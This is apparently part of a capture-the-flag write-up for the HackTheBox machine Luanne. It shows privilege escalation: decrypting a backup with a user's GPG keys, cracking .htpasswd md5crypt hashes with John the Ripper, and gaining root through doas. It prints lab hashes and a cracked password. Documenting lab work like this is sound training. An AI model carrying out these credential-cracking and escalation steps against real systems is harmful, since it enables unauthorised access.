# Priv Esc

## gpg decrypt

First note there gpg keys in r.michaels folder

```text
luanne$ ls -lah ~/.gnupg
total 2.8K
drwx------  2 r.michaels  users  512B Sep 14  2020 .
dr-xr-x---  7 r.michaels  users  512B Sep 16  2020 ..
-rw-------  1 r.michaels  users  603B Sep 14  2020 pubring.gpg
-rw-------  1 r.michaels  users  1.3K Sep 14  2020 secring.gpg
```

Use that to decrypt the archive file

```text
luanne$ netpgp --decrypt --output=/var/shm/devel_backup.tar.gz devel_backup-2020-09-16.tar.gz.enc
signature  2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a
uid              RSA 2048-bit key <r.michaels@localhost>

luanne$ ls -lah /var/shm/devel_backup.tar.gz
-rw-------  1 r.michaels  wheel  1.6K May 26 15:29 /var/shm/devel_backup.tar.gz
```

After transferring back and unzipping we see

```text
root@kali:~/CTF/HTB/Luanne/PE/devel-2020-09-16# tree -a
.
├── webapi
│   └── weather.lua
└── www
    ├── .htpasswd
    └── index.html
    
2 directories, 3 files
```

Crack it on john WSL

```text
ivan@Laptop:/mnt/***********/HTB/Luanne$ cat htpasswd
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
devel_backup:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.

ivan@Laptop:/mnt/***********/HTB/Luanne$ /opt/john/run/john --wordlist=/opt/Seclists/rockyou.txt --rules htpasswd
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Remaining 1 password hash
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
littlebear       (devel_backup)
1g 0:00:00:01 DONE (2021-05-26 23:34) 0.9803g/s 12800p/s 12800c/s 12800C/s gamboa..hello11
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Use it to run sudo 

```text
luanne$ doas -u root su root
Password:
# id
uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)
```

